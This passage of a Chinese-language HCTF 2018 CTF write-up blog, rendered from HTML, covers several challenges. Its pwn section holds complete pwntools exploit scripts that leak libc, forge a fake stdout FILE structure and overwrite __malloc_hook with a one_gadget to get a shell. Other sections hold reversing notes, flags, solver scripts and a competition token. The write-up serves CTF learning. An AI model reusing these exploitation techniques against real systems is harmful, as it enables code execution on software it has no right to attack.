<span class=\"keyword\">else</span>:</span><br><span class=\"line\">            p = process(BIN_PATH, env=&#123;<span class=\"string\">'LD_PRELOAD'</span>: <span class=\"string\">'./libc.so.6'</span>&#125;)</span><br><span class=\"line\">        elf = ELF(BIN_PATH)</span><br><span class=\"line\">        context.log_level = <span class=\"string\">'debug'</span></span><br><span class=\"line\">        context.terminal = [<span class=\"string\">'tmux'</span>, <span class=\"string\">'split'</span>, <span class=\"string\">'-h'</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> context.arch == <span class=\"string\">'amd64'</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> local == <span class=\"number\">1</span>:</span><br><span class=\"line\">                libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                libc = ELF(<span class=\"string\">'./libc.so.6'</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            libc = ELF(<span class=\"string\">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        p = remote(<span class=\"string\">'150.109.44.250'</span>, <span class=\"number\">20002</span>)</span><br><span class=\"line\">        p.recvuntil(<span class=\"string\">'Input your token:'</span>)</span><br><span class=\"line\">        p.sendline(<span class=\"string\">'8RMQq9PuDRurd91OVhADpDDK30eqjAqz'</span>)</span><br><span class=\"line\">        elf = ELF(BIN_PATH)</span><br><span class=\"line\">        libc = ELF(<span class=\"string\">'./libc.so.6'</span>)</span><br><span class=\"line\">        context.log_level = <span class=\"string\">'debug'</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> DEBUG == <span class=\"number\">1</span>:</span><br><span class=\"line\">        gdb.attach(p, gdbscript=<span class=\"string\">'b *0x0000555555554964'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">'here is a gift '</span>)</span><br><span class=\"line\">    recv = p.recvuntil(<span class=\"string\">','</span>, drop=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    libc.address = int(recv, <span class=\"number\">16</span>) - libc.symbols[<span class=\"string\">'sleep'</span>]</span><br><span class=\"line\">    <span class=\"keyword\">print</span> hex(libc.address)</span><br><span class=\"line\">    one_gadget = [<span class=\"number\">0x45216</span>, <span class=\"number\">0x4526a</span>, <span class=\"number\">0xf02a4</span>, <span class=\"number\">0xf1147</span>]</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">'luck ;)\\n'</span>)</span><br><span class=\"line\">    p.send(p64(libc.address + (<span class=\"number\">0x7ffff7ffdf48</span> - <span class=\"number\">0x00007ffff7a0d000</span>)))</span><br><span class=\"line\">    p.send(p64(libc.address + one_gadget[<span class=\"number\">2</span>])[<span class=\"number\">0</span>])</span><br><span class=\"line\">    p.send(p64(libc.address + (<span class=\"number\">0x7ffff7ffdf48</span> - <span class=\"number\">0x00007ffff7a0d000</span>) + <span class=\"number\">1</span>))</span><br><span class=\"line\">    p.send(p64(libc.address + one_gadget[<span class=\"number\">2</span>])[<span class=\"number\">1</span>])</span><br><span class=\"line\">    p.send(p64(libc.address + (<span class=\"number\">0x7ffff7ffdf48</span> - <span class=\"number\">0x00007ffff7a0d000</span>) + <span class=\"number\">2</span>))</span><br><span class=\"line\">    p.send(p64(libc.address + one_gadget[<span class=\"number\">2</span>])[<span class=\"number\">2</span>])</span><br><span class=\"line\">    p.send(p64(libc.address + (<span class=\"number\">0x7ffff7ffdf48</span> - <span class=\"number\">0x00007ffff7a0d000</span>) + <span class=\"number\">3</span>))</span><br><span class=\"line\">    p.send(p64(libc.address + one_gadget[<span class=\"number\">2</span>])[<span class=\"number\">3</span>])</span><br><span class=\"line\">    p.send(p64(libc.address + (<span class=\"number\">0x7ffff7ffdf48</span> - <span class=\"number\">0x00007ffff7a0d000</span>) + <span class=\"number\">4</span>))</span><br><span class=\"line\">    p.send(p64(libc.address + one_gadget[<span class=\"number\">2</span>])[<span class=\"number\">4</span>])</span><br><span class=\"line\">    <span class=\"comment\"># exec /bin/sh 1&gt;&amp;0</span></span><br><span class=\"line\">    p.interactive()</span><br><span class=\"line\">    p.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    pwn()</span><br></pre></td></tr></table></figure></p>\n<p>flag:<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">### babyprintf_ver2</span><br><span class=\"line\"></span><br><span class=\"line\">该程序通过read向bss上的全局变量输入数据，其后是stdout指针，可以进行覆盖篡改。由于知道bss的地址，首先将stdout指针的值修改为bss的地址，并在bss上布置虚假的stdout的FILE结构体，vtable地址由于程序本身带有检测，会自动填入。通过设置FILE结构体中的缓冲区指针，泄漏libc地址和修改__malloc_hook的值为one_gadget。最后通过触发printf_chk的报错使得程序调用malloc函数进而getshell。</span><br><span class=\"line\">```python</span><br><span class=\"line\"># coding=utf-8</span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">def pwn():</span><br><span class=\"line\">    BIN_PATH = &apos;./babyprintf_ver2&apos;</span><br><span class=\"line\">    DEBUG = 0</span><br><span class=\"line\">    context.arch = &apos;amd64&apos;</span><br><span class=\"line\">    if DEBUG == 1:</span><br><span class=\"line\">        p = process(BIN_PATH)</span><br><span class=\"line\">        elf = ELF(BIN_PATH)</span><br><span class=\"line\">        context.log_level = &apos;debug&apos;</span><br><span class=\"line\">        context.terminal = [&apos;tmux&apos;, &apos;split&apos;, &apos;-h&apos;]</span><br><span class=\"line\">        if context.arch == &apos;amd64&apos;:</span><br><span class=\"line\">            libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            libc = ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        p = remote(&apos;150.109.44.250&apos;, 20005)</span><br><span class=\"line\">        elf = ELF(BIN_PATH)</span><br><span class=\"line\">        libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class=\"line\">        p.recvuntil(&apos;Input your token:&apos;)</span><br><span class=\"line\">        p.sendline(&apos;8RMQq9PuDRurd91OVhADpDDK30eqjAqz&apos;)</span><br><span class=\"line\">        context.log_level = &apos;debug&apos;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    p.recvuntil(&apos;buffer location to&apos;)</span><br><span class=\"line\">    recv = p.recvuntil(&apos;\\n&apos;, drop=True)</span><br><span class=\"line\">    bss_address = int(recv, 16)</span><br><span class=\"line\">    p.recvuntil(&apos;Have fun!\\n&apos;)</span><br><span class=\"line\">    payload = &apos;a&apos; * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884) + p64(bss_address + 0xf8) * 3</span><br><span class=\"line\">    payload += p64(bss_address + 0xf8) + p64(bss_address + 0x100) + p64(bss_address + 0x11d)</span><br><span class=\"line\">    payload += p64(bss_address + 0xf8) + p64(bss_address + 0x11d) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000)</span><br><span class=\"line\">    payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff)</span><br><span class=\"line\"></span><br><span class=\"line\">    p.sendline(payload)</span><br><span class=\"line\">    p.recvuntil(&apos;permitted!\\n&apos;)</span><br><span class=\"line\">    p.sendline(&apos;a&apos; * 8)</span><br><span class=\"line\">    recv = p.recv(8)</span><br><span class=\"line\">    libc.address = u64(recv) - (0x7ffff7dcc2a0 - 0x7ffff79e4000)</span><br><span class=\"line\">    print hex(libc.address)</span><br><span class=\"line\"></span><br><span class=\"line\">    payload = &apos;a&apos; * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884)</span><br><span class=\"line\">    payload += p64(bss_address + 0x200) * 7</span><br><span class=\"line\">    payload += p64(bss_address + 0x200) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000)</span><br><span class=\"line\">    payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff)</span><br><span class=\"line\"></span><br><span class=\"line\">    p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    malloc_hook_addr = libc.symbols[&apos;__malloc_hook&apos;]</span><br><span class=\"line\"></span><br><span class=\"line\">    payload = &apos;a&apos; * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884)</span><br><span class=\"line\">    payload += p64(bss_address + 0x200) * 6</span><br><span class=\"line\">    payload += p64(malloc_hook_addr) + p64(malloc_hook_addr + 0x8 + 4) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000)</span><br><span class=\"line\">    payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff)</span><br><span class=\"line\">    p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    p.sendline(p64(libc.address + 0x10a38c)) # one_gadget</span><br><span class=\"line\"></span><br><span class=\"line\">    payload = &apos;a&apos; * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884)</span><br><span class=\"line\">    payload += p64(bss_address + 0x200) * 7</span><br><span class=\"line\">    payload += p64(bss_address + 0x200) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000)</span><br><span class=\"line\">    payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff)</span><br><span class=\"line\">    p.sendline(payload)</span><br><span class=\"line\">    sleep(0.5)</span><br><span class=\"line\">    p.sendline(&apos;%49$p&apos;)</span><br><span class=\"line\">    </span><br><span class=\"line\">    p.interactive()</span><br><span class=\"line\">    p.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &apos;__main__&apos;:</span><br><span class=\"line\">    pwn()</span><br></pre></td></tr></table></figure></p>\n<p>flag:<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">## re</span><br><span class=\"line\"></span><br><span class=\"line\">### LuckStar</span><br><span class=\"line\">这题有不少反调试.</span><br><span class=\"line\">首先在TlsCallback_0里获取了一堆反调试常用函数地址:</span><br><span class=\"line\">![](http://ww1.sinaimg.cn/large/006ZzYxZly1fx4ylwxkhkj31iw0abjru.jpg)</span><br><span class=\"line\">排查几款调试器，并解混淆的main函数</span><br><span class=\"line\">![](http://ww1.sinaimg.cn/large/006ZzYxZly1fx4ymtx7s7j315e0n4js0.jpg)</span><br><span class=\"line\">在之前获取的CheckRemoteDebuggerPresent函数下断点</span><br><span class=\"line\">![](http://ww1.sinaimg.cn/large/006ZzYxZly1fx4yn2l65cj30nw06h3yw.jpg)</span><br><span class=\"line\">发现在调用main之前被调用，用于重设srand的种子,应为hctf。</span><br><span class=\"line\">接着进入main函数：</span><br><span class=\"line\">![](http://ww1.sinaimg.cn/large/006ZzYxZly1fx4yn9qzczj30t10lp76f.jpg)</span><br><span class=\"line\">main函数里，my_base64函数被混淆，只用用seed=hctf才能正确还原。</span><br><span class=\"line\">my_base64如下：</span><br><span class=\"line\">![](http://ww1.sinaimg.cn/large/006ZzYxZly1fx4ynimy3ij30th0f9q3k.jpg)</span><br><span class=\"line\">在my_base64里面对输入的字符进行变异的base64处理，不过把大小写互换，然后把加密的结果做一段xor处理。return后与main函数里预存储的v17做比较，相同则得到flag。</span><br><span class=\"line\">由于仅作xor处理，这里我动调时把预存储的v17数据放在xor处理执行，得到base64(flag),</span><br><span class=\"line\">![](http://ww1.sinaimg.cn/large/006ZzYxZly1fx4ypprkjaj30gr022t99.jpg)</span><br><span class=\"line\">做大小写转换后，解base64得flag:</span><br><span class=\"line\">![](http://ww1.sinaimg.cn/large/006ZzYxZly1fx4ypyyscwj305x00xwec.jpg)</span><br><span class=\"line\"></span><br><span class=\"line\">### Seven</span><br><span class=\"line\"></span><br><span class=\"line\">驱动程序逆向，程序关键逻辑很少，需要我们走一个类似7字的迷宫，迷宫图直接就能看到，四个十六进制码0x11,0x1F,0x1E,0x20分别控制人物的上下左右移动，o代表当前位置，\\*代表不可行位置，.代表可行位置。整个程序找不到输入，但是能发现一个12字节的结构体，查阅资料发现是KEYBOARD_INPUT_DATA结构，第二个USHORT成员MAKECODE是键盘的扫描码，搜索扫描码，得到四个十六进制码分别对应wsad。</span><br><span class=\"line\">flag:```hctf&#123;ddddddddddddddssaasasasasasasasasas&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"PolishDuck\"><a href=\"#PolishDuck\" class=\"headerlink\" title=\"PolishDuck\"></a>PolishDuck</h3><p>Badusb的题目，同种类型的题目出现了很多次，印象里最先看到是在pwnhub-血月归来一题，后来是HITB-hex一题，到SUCTF2018的SecretGarden，XCTF2018Final，然后是HCTF2018的PolishDuck，做法和pwnhub上面的一模一样，都是打开notepad.exe，然后输入一串计算数字。我们只要整理出数字串，计算出结果，hex再hex解码即可得到flag。<br>flag:<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">## misc</span><br><span class=\"line\"></span><br><span class=\"line\">### freq game</span><br><span class=\"line\">这个题题目大概就是把4个字符的ascii码作为参数进行正弦变换然后加起来的结果，看完代码发现最后乘的rge并没有卵用所以可以消掉，就变成了y/7 = sin() + sin() + sin() + sin()的样子，所以我找了y/7 &gt; 3的y作为约束条件，因为此时对应的四个sin()值必须都要大于y/7-3。本来是想把这个作为约束条件缩小范围再爆破的，结果用这个条件基本上就能把答案约束出来了，中间好像只有一组数是需要进一步爆破的，但剩的也不多所以很容易就获得了结果。代码如下：</span><br><span class=\"line\">```python</span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\">import numpy as np</span><br><span class=\"line\"></span><br><span class=\"line\">def show(mylist,testlist):</span><br><span class=\"line\">    for i in range(len(testlist)):</span><br><span class=\"line\">        if mylist[testlist[i][0]] &lt; testlist[i][1] - 3.0 :</span><br><span class=\"line\">            return False</span><br><span class=\"line\">    return True</span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(&apos;150.109.119.46&apos;,6775)</span><br><span class=\"line\">print p.recv()</span><br><span class=\"line\">print p.recv()</span><br><span class=\"line\">p.sendline(&apos;y&apos;)</span><br><span class=\"line\">print p.recv()</span><br><span class=\"line\">p.sendline(&apos;8RMQq9PuDRurd91OVhADpDDK30eqjAqz&apos;)</span><br><span class=\"line\">res = &apos;&apos;</span><br><span class=\"line\">for i in range(8):</span><br><span class=\"line\">    res = res + p.recv()</span><br><span class=\"line\">res = res + p.recvuntil(&apos;]&apos;)</span><br><span class=\"line\">p.sendline(&quot;137 212 218 251&quot;)</span><br><span class=\"line\">res = &apos;&apos;</span><br><span class=\"line\">for i in range(8):</span><br><span class=\"line\">    res = res + p.recv()</span><br><span class=\"line\">res = res + p.recvuntil(&apos;]&apos;)</span><br><span class=\"line\">p.sendline(&quot;57 79 80 210&quot;)</span><br><span class=\"line\">res = &apos;&apos;</span><br><span class=\"line\">for i in range(8):</span><br><span class=\"line\">    res = res + p.recv()</span><br><span class=\"line\">res = res + p.recvuntil(&apos;]&apos;)</span><br><span class=\"line\">p.sendline(&quot;89 128 170 130&quot;)</span><br><span class=\"line\">res = &apos;&apos;</span><br><span class=\"line\">for i in range(8):</span><br><span class=\"line\">    res = res + p.recv()</span><br><span class=\"line\">res = res + p.recvuntil(&apos;]&apos;)</span><br><span class=\"line\">p.sendline(&quot;28 117 198 213&quot;)</span><br><span class=\"line\">res = &apos;&apos;</span><br><span class=\"line\">for i in range(8):</span><br><span class=\"line\">    res = res + p.recv()</span><br><span class=\"line\">res = res + p.recvuntil(&apos;]&apos;)</span><br><span class=\"line\">p.sendline(&quot;95 111 169 222&quot;)</span><br><span class=\"line\">res = &apos;&apos;</span><br><span class=\"line\">for i in range(8):</span><br><span class=\"line\">    res = res + p.recv()</span><br><span class=\"line\">res = res + p.recvuntil(&apos;]&apos;)</span><br><span class=\"line\">p.sendline(&quot;2 75 210 213&quot;)</span><br><span class=\"line\">res = &apos;&apos;</span><br><span class=\"line\">for i in range(8):</span><br><span class=\"line\">    res = res + p.recv()</span><br><span class=\"line\">res = res + p.recvuntil(&apos;]&apos;)</span><br><span class=\"line\">p.sendline(&quot;38 162 175 180&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">res = &apos;&apos;</span><br><span class=\"line\">for i in range(8):</span><br><span class=\"line\">    res = res + p.recv()</span><br><span class=\"line\">res = res + p.recvuntil(&apos;]&apos;)</span><br><span class=\"line\">res = res[1:-1]</span><br><span class=\"line\"></span><br><span class=\"line\">numlist = []</span><br><span class=\"line\">ressplit = res.split(&apos;,&apos;)</span><br><span class=\"line\">testlist = []</span><br><span class=\"line\">for i in range(len(ressplit)):</span><br><span class=\"line\">    numlist.append(float(ressplit[i])/7.0)</span><br><span class=\"line\">    if float(ressplit[i])/7.0 &gt; 3.0:</span><br><span class=\"line\">        testlist.append((i,float(ressplit[i])/7.0))</span><br><span class=\"line\"></span><br><span class=\"line\">print testlist</span><br><span class=\"line\"></span><br><span class=\"line\">mylist = []</span><br><span class=\"line\">for i in range(256):</span><br><span class=\"line\">    temp = []</span><br><span class=\"line\">    x = np.linspace(0,1,1500)</span><br><span class=\"line\">    y = np.sin(2*np.pi*x*i)</span><br><span class=\"line\">    mylist.append(list(y))</span><br><span class=\"line\">    if show(list(y),testlist) :</span><br><span class=\"line\">        print i</span><br><span class=\"line\">&apos;&apos;&apos;</span><br><span class=\"line\">temp = [88,89,128,129,130,169,170]</span><br><span class=\"line\">print testlist[2][1]</span><br><span class=\"line\">for a in temp:</span><br><span class=\"line\">    for b in temp:</span><br><span class=\"line\">        for c in temp:</span><br><span class=\"line\">            for d in temp:</span><br><span class=\"line\">                if mylist[a][testlist[2][0]] + mylist[b][testlist[2][0]] + mylist[c][testlist[2][0]] + mylist[d][testlist[2][0]] = testlist[2][1]:</span><br><span class=\"line\">                    print a,b,c,d</span><br><span class=\"line\">&apos;&apos;&apos;</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<p>因为懒得把代码复制粘贴8遍，所以我是得到每轮结果以后把它保存下来，重开一个直接发过去的，所以最后脚本里只保留了最后一轮的过程，前面的都简化成了发结果。。。</p>\n<h3 id=\"Guess-My-Key\"><a href=\"#Guess-My-Key\" class=\"headerlink\" title=\"Guess My Key\"></a>Guess My Key</h3><p>这题听说是机器学习一开始没敢做，后来想想好像没那么难，题目思路是96bit的msg和96bit的key，可以任意提交msg和key来得到加密结果，或者提交msg获得用预设的key加密的结果，然后去猜题目预设的key。这个题我的思路是把raw_cipher当作一个空间向量，对每一bit的key去计算它是0和1时与key所获得的raw_cipher之间的距离来分析这1bit为0或1的概率，不断拟合使我计算所得的key与预设的key得到的空间向量不断接近，从而获得预设的key，代码如下：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> urllib <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\">url = <span class=\"string\">'http://150.109.62.46:13577/enc?'</span></span><br><span class=\"line\"></span><br><span class=\"line\">orilist = []</span><br><span class=\"line\">orilist.append([<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span 